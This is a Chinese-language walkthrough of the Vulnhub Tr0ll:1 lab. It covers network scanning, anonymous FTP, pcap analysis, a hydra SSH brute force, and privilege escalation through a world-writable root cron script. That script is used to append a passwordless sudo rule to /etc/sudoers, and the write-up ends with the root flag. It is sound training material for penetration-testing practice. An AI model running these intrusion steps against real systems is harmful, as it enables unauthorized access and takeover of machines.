# Tr0ll:1 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/tr0ll-1,100/
-   下载地址：https://download.vulnhub.com/tr0ll/Tr0ll.rar



## 信息收集

### 主机发现

>   └─$ sudo netdiscover -i eth0 -r 192.168.2.1/24

```shell
 Currently scanning: Finished!   |   Screen View: Unique Hosts              
                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.2.1     aa:a1:59:52:23:67      1      60  Unknown vendor           
 192.168.2.2     00:50:56:e9:75:ca      1      60  VMware, Inc.             
 192.168.2.141   00:0c:29:3b:96:d8      1      60  VMware, Inc.             
 192.168.2.254   00:50:56:f3:2e:7c      1      60  VMware, Inc.             

```





### 端口扫描

```shell
# TCP扫描
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.141 -oA Nmap-scan/sT
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:07 HKT
Nmap scan report for 192.168.2.141
Host is up (0.0012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:3B:96:D8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds

# UDP扫描
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.141 -oA Nmap-scan/sU 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:08 HKT
Warning: 192.168.2.141 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.141
Host is up (0.00080s latency).
All 65535 scanned ports on 192.168.2.141 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:3B:96:D8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 73.00 seconds

```





### 服务及操作系统扫描

```shell
└─$ sudo nmap -sC -sV -O -p21,22,80 --min-rate 10000 192.168.2.141 -oA Nmap-scan/sC   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:11 HKT
Nmap scan report for 192.168.2.141
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.2.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret
MAC Address: 00:0C:29:3B:96:D8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds

```



### 调用默认漏洞脚本扫描

```shell
└─$ sudo nmap --script=vuln -p21,22,80 192.168.2.141 -oA Nmap-scan/Script          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:15 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.141
Host is up (0.00052s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:3B:96:D8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.58 seconds

```



### ftp探测

-   使用`anonymous`进行匿名登陆

```shell
└─$ ftp 192.168.2.141
Connected to 192.168.2.141.
220 (vsFTPd 3.0.2)
Name (192.168.2.141:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||62390|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||16919|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |***************************************************************************************************************|  8068        6.80 MiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (5.06 MiB/s)
ftp> exit
221 Goodbye.

```



### 使用Wireshark查看下载到的流量包

通过追踪tcp流看到一些提示

![image-20230602102511254](https://raw.githubusercontent.com/r0o983/images/main/image-20230602102511254.png)

使用`strings`来查看文件

```shell
└─$ strings ../Documents/WalkThrough/Tr0ll1.0/lol.pcap  
Linux 3.12-kali1-486
Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)
eth0
host 10.0.0.6
Linux 3.12-kali1-486
220 (vsFTPd 3.0.2)
"USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
226 Directory send OK.
TYPE I
W200 Switching to Binary mode.
PORT 10,0,0,12,202,172
g>      @
W200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!
W226 Transfer complete.
TYPE A
O200 Switching to ASCII mode.
{PORT 10,0,0,12,172,74
O200 PORT command successful. Consider using PASV.
{LIST
O150 Here comes the directory listing.
O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
O226 Directory send OK.
{QUIT
221 Goodbye.
Counters provided by dumpcap

```



## web

-   首页：

-   ![image-20230602102856308](https://raw.githubusercontent.com/r0o983/images/main/image-20230602102856308.png)

-   根据之前的默认脚本扫描得知，存在`robots`文件

-   ![image-20230602102958677](https://raw.githubusercontent.com/r0o983/images/main/image-20230602102958677.png)

-   ![image-20230602103632859](https://raw.githubusercontent.com/r0o983/images/main/image-20230602103632859.png)

-   将图片下载之后使用`strings`进行图片内容查看

-   ![image-20230602103913113](https://raw.githubusercontent.com/r0o983/images/main/image-20230602103913113.png)

-   使用`hashid`进行查看类型

-   ```shell
    └─$ hashid CDEFGHIJSTUVWXYZcdefghijstuvwxyz                
    Analyzing 'CDEFGHIJSTUVWXYZcdefghijstuvwxyz'
    [+] DNSSEC(NSEC3) 
    
    ```

-   尝试访问之前流量包中提到的地址：

-   ![image-20230602110200956](https://raw.githubusercontent.com/r0o983/images/main/image-20230602110200956.png)

-   下载文件到本地查看

-   ```shell
    └─$ wget http://192.168.2.141/sup3rs3cr3tdirlol/roflmao
    --2023-06-02 11:02:33--  http://192.168.2.141/sup3rs3cr3tdirlol/roflmao
    Connecting to 192.168.2.141:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 7296 (7.1K)
    Saving to: ‘roflmao’
    
    roflmao                                100%[============================================================================>]   7.12K  --.-KB/s    in 0s      
    
    2023-06-02 11:02:33 (20.0 MB/s) - ‘roflmao’ saved [7296/7296]
    
    ```

-   使用`strings`查看文件内容

-   ```shell
    └─$ strings roflmao                                                      
    /lib/ld-linux.so.2
    libc.so.6
    _IO_stdin_used
    printf
    __libc_start_main
    __gmon_start__
    GLIBC_2.0
    PTRh
    [^_]
    Find address 0x0856BF to proceed
    ;*2$"
    GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
    .symtab
    .strtab
    .shstrtab
    .interp
    .note.ABI-tag
    .note.gnu.build-id
    .gnu.hash
    .dynsym
    .dynstr
    .gnu.version
    .gnu.version_r
    .rel.dyn
    .rel.plt
    .init
    .text
    .fini
    .rodata
    .eh_frame_hdr
    .eh_frame
    .init_array
    .fini_array
    .jcr
    .dynamic
    .got
    .got.plt
    .data
    .bss
    .comment
    crtstuff.c
    __JCR_LIST__
    deregister_tm_clones
    register_tm_clones
    __do_global_dtors_aux
    completed.6590
    __do_global_dtors_aux_fini_array_entry
    frame_dummy
    __frame_dummy_init_array_entry
    roflmao.c
    __FRAME_END__
    __JCR_END__
    __init_array_end
    _DYNAMIC
    __init_array_start
    _GLOBAL_OFFSET_TABLE_
    __libc_csu_fini
    _ITM_deregisterTMCloneTable
    __x86.get_pc_thunk.bx
    data_start
    printf@@GLIBC_2.0
    _edata
    _fini
    __data_start
    __gmon_start__
    __dso_handle
    _IO_stdin_used
    __libc_start_main@@GLIBC_2.0
    __libc_csu_init
    _end
    _start
    _fp_hw
    __bss_start
    main
    _Jv_RegisterClasses
    __TMC_END__
    _ITM_registerTMCloneTable
    _init
    
    ```

-   使用提示信息，找到一个新的目录

-   ![image-20230602112520089](https://raw.githubusercontent.com/r0o983/images/main/image-20230602112520089.png)

-   进入`good_luck`目录查看到有一个类似用户名的文件

-   ![image-20230602112646624](https://raw.githubusercontent.com/r0o983/images/main/image-20230602112646624.png)

-   将文件内容保存，查看提示的密码文件夹。并获得密码

-   ![image-20230602112748422](https://raw.githubusercontent.com/r0o983/images/main/image-20230602112748422.png)

-   将文件保存到本地，等待破解

### 使用hydra进行ssh破解

```shell
└─$ hydra -L which_one_lol.txt -P Pass.txt ssh://192.168.2.141
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-02 11:29:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.2.141:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-02 11:30:02

```

-   没有得到任何登陆成功的账号或密码，返回页面查看提示。
-   提示当前文件夹中包含密码，尝试使用文件名来进行密码尝试
-   ![image-20230602113405129](https://raw.githubusercontent.com/r0o983/images/main/image-20230602113405129.png)
-   获得一组账号密码：`overflow.  Pass.txt`



### 获得ssh初始权限

```shell
└─$ ssh overflow@192.168.2.141                                  
The authenticity of host '192.168.2.141 (192.168.2.141)' can't be established.
ED25519 key fingerprint is SHA256:jhpbgUldAKI9YAJOKhJZe9ypYt7GlEKUKU2WQ+zZBSs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.141' (ED25519) to the list of known hosts.
overflow@192.168.2.141's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ whoami
overflow
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:3b:96:d8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.141/24 brd 192.168.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe3b:96d8/64 scope link 
       valid_lft forever preferred_lft forever
$ uname -a
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
$ sudo -l
sudo: unable to resolve host troll
[sudo] password for overflow: 
Sorry, user overflow may not run sudo on troll.

```

-   当前用户并没有查看`sudo -l `权限



### 提权

-   查找当前系统是否存在自动任务

-   ```shell
    $ cat /etc/crontab
    cat: /etc/crontab: Permission denied
    $ cd /var/www
    $ ls
    html
                                                                                   
    Broadcast Message from root@trol                                               
            (somewhere) at 20:40 ...                                               
                                                                                   
    TIMES UP LOL!                                                                  
                                                                                   
    Connection to 192.168.2.141 closed by remote host.
    Connection to 192.168.2.141 closed.
    
    ```

-   在执行敏感文件查找时遭遇系统退出，根据提示得出并非人为操作。

-   ```shell
    $ ls
    cleaner.py.swp
    $ pwd
    /var/tmp
    $ cat cleaner.py.swp
    crontab for cleaner.py successful
    $ 
    ```

-   使用find命令查找当前系统中存在的cleaner.py文件

-   ```shell
    $ find / -name cleaner.py 2>/dev/null   
    /lib/log/cleaner.py
    $ ls -lhai /lib/log/cleaner.py
    155826 -rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
    $ 
    ```

-   进一步发现当前文件是具有所有用户的写权限。将当前用户添加到`sudoers`文件中 -->`echo "overflow ALL=(ALL:ALL) NOPASSWD:ALL" >>/etc/sudoers`

-   ![image-20230602120401494](https://raw.githubusercontent.com/r0o983/images/main/image-20230602120401494.png)

-   提权成功！

-   ```shell
    $ sudo -l
    sudo: unable to resolve host troll
    Matching Defaults entries for overflow on troll:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User overflow may run the following commands on troll:
        (ALL : ALL) NOPASSWD: ALL
    
    $ sudo /bin/bash
    sudo: unable to resolve host troll
    root@troll:/# whoami
    root
    root@troll:/# ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:3b:96:d8 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.141/24 brd 192.168.2.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe3b:96d8/64 scope link 
           valid_lft forever preferred_lft forever
    root@troll:/# cat /root/
    .bash_history     proof.txt         .selected_editor  .ssh/             .viminfo          
    root@troll:/# cat /root/proof.txt 
    Good job, you did it! 
    
    
    702a8c18d29c6f3ca0d99ef5712bfbdc
    root@troll:/# 
    ```

    